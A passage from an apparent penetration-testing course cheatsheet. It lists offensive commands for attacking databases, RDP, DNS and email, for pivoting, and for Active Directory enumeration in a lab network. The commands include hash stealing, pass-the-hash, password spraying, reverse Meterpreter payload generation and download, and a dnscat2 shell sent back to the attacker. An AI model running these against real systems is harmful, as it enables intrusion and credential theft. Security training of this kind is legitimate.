| `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL.  |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.  |


#### Attacking RDP

|**Command**|**Description**|
|-|-|
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service. |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143` | Connect to the RDP service using `rdesktop` in Linux. |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password. |
| `net start sessionhijack` | Execute the RDP session hijack. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |

#### Attacking DNS

|**Command**|**Description**|
|-|-|
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v` | Brute-forcing subdomains. |
| `host support.inlanefreight.com` | DNS lookup for the specified subdomain## Attacking Email Services

|**Command**|**Description**|
|-|-|
| `host -t MX microsoft.com` | DNS lookup for mail servers for the specified domain. |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | DNS lookup for mail servers for the specified domain. |
| `host -t A mail1.inlanefreight.htb.` | DNS lookup of the IPv4 address for the specified subdomain. |
| `telnet 10.10.110.20 25` | Connect to the SMTP server. |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | SMTP user enumeration using the RCPT command against the specified host. |
| `python3 o365spray.py --validate --domain msplaintext.xyz` | Verify the usage of Office365 for the specified domain. |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` | Enumerate existing users using Office365 on the specified domain. |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Brute-forcing the POP3 service. |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |

## 20. Pivoting, Tunneling & Port Forwarding

### Cheatsheet

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `ifconfig`                                                     | Linux-based command that displays all current network configurations of a system. |
| `ipconfig`                                                     | Windows-based command that displays all system network configurations. |
| `netstat -r`                                                   | Command used to display the routing table for all IPv4-based protocols. |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                       | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`        | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306. |
| `netstat -antp \| grep 1234`                                   | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` . |
| `nmap -v -sV -p1234 localhost`                                 | Nmap command used to scan a host through a connection that has been made on local port `1234`. |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>` | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`. |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                       | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |
| `tail -4 /etc/proxychains.conf`                                | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. |
| `proxychains nmap -v -sn 172.16.5.1-200`                       | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`). |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                      | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`). |
| `proxychains msfconsole`                                       | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. |
| `msf6 > search rdp_scanner`                                    | Metasploit search that attempts to find a module called `rdp_scanner`. |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123` | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`. |
| `msf6 > use exploit/multi/handler`                             | Used to select the multi-handler exploit module in Metasploit. |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`           | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`). |
| `python3 -m http.server 8123`                                  | Uses Python3 to start a simple HTTP server listening on port` 8123`. Can be used to retrieve files from a host. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |
|                                                              |                                                              |
| `for i in {1...254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |
| `msf6 > use auxiliary/server/socks_proxy`                      | Metasploit command that selects the `socks_proxy` auxiliary module. |
| `msf6 auxiliary(server/socks_proxy) > jobs`                    | Metasploit command that lists all currently running jobs.    |
| `socks4 	127.0.0.1 9050`                                    | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |
| `Socks5 127.0.0.1 1080`                                        | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5  proxy is used in combination with proxychains on the specified IP address and port. |
| `msf6 > use post/multi/manage/autoroute`                       | Metasploit command used to select the autoroute module.      |
|                                                              |                                                              |
| `meterpreter > help portfwd`                                   | Meterpreter command used to display the features of the portfwd command. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>` | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`             | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. |
| `netstat -antp`                                                | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host. |
| `meterpreter > bg`                                             | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`  | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`    | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                     | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                | Uses apt-get to install the tool sshuttle.                   |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`          | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`). |
| `sudo git clone https://github.com/klsecservices/rpivot.git`   | Clones the rpivot project GitHub repository.                 |
| `sudo apt-get install python2.7`                               | Uses apt-get to install python2.7.                           |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`). |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                     | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port. |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`      | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows-based command that uses `netsh.exe` to configure a portproxy rule called ` v4tov4`  that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |
| `netsh.exe interface portproxy show v4tov4`                    | Windows-based command used to view the configurations of a portproxy rule called v4tov4. |
| `git clone https://github.com/iagox86/dnscat2.git`             | Clones the `dnscat2` project GitHub repository.              |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled. |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clones the dnscat2-powershell project Github repository.     |
| `Import-Module dnscat2.ps1`                                    | PowerShell command used to import the dnscat2.ps1 tool.      |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`). |
| `dnscat2> ?`                                                   | Used to list dnscat2 options.                                |
| `dnscat2> window -i 1`                                         | Used to interact with an established dnscat2 session.        |
| `./chisel server -v -p 1234 --socks5`                          | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks`                  | Used to connect to a chisel server at the specified IP address & port using socks. |
| `git clone https://github.com/utoni/ptunnel-ng.git`            | Clones the ptunnel-ng project GitHub repository.             |
| `sudo ./autogen.sh`                                            | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                       | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`). |
| `ssh -p2222 -lubuntu 127.0.0.1`                                | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                         | Windows-based command used to register the SocksOverRDP-PLugin.dll. |
| `netstat -antb \|findstr 1080`                                 | Windows-based command used to list TCP network connections listening on port 1080. |

## 21. Active Directory Enumeration & Attacks

### Cheatsheet

#### Initial Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nslookup ns1.inlanefreight.com`                             | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
| `sudo tcpdump -i ens224`                                     | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |
| `sudo responder -I ens224 -A`                                | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |
| `fping -asgq 172.16.5.0/23`                                  | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |
| `sudo git clone https://github.com/ropnop/kerbrute.git`      | Uses `git` to clone the kerbrute tool from a Linux-based host. |
| `make help`                                                  | Used to list compiling options that are possible with `make` from a Linux-based host. |
| `sudo make all`                                              | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64`                                     | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |

#### LLMNR/NTB-NS Poisoning 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |

#### Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux  -P 172.16.5.5`                                  | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain from a Linux-based host. |
| `net accounts`                                               | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1`                              | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host. |
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5  rpcclient $> enumdomuser`    | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users`                        | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |

#### Enumerating Security Controls

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-MpComputerStatus`                                       | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode`                | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host. |
| `Find-LAPSDelegatedGroups`                                   | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |
| `Find-AdmPwdExtendedRights`                                  | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                          | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |

#### Credentialed Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files.  The results are outputted in `JSON`. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| ` rpcclient $> queryuser 0x457`                              | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers`                                  | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  ` | Impacket tool used to connect to the `CLI`  of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  ` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h`                                         | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`)  as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |

#### Enumeration by Living Off the Land

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
| `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name`                        | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"`                   | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"`             | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV`                                        | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |
| `ConvertTo-SID`                                              | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |
| `Get-DomainSPNTicket`                                        | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |
| `Get-Domain`                                                 | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController`                                       | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser`                                             | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer`                                         | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup`                                            | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU`                                               | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl`                                  | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember`                                      | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer`                                       | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare`                                         | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO`                                              | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy`                                           | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup`                                          | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember`                                    | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare`                                               | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession`                                             | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess`                                           | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation`                                    | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare`                                           | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile`                            | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess`                                      | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |
| `Get-DomainTrust`                                            | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust`                                            | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser`                                      | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember`                               | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`   | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |
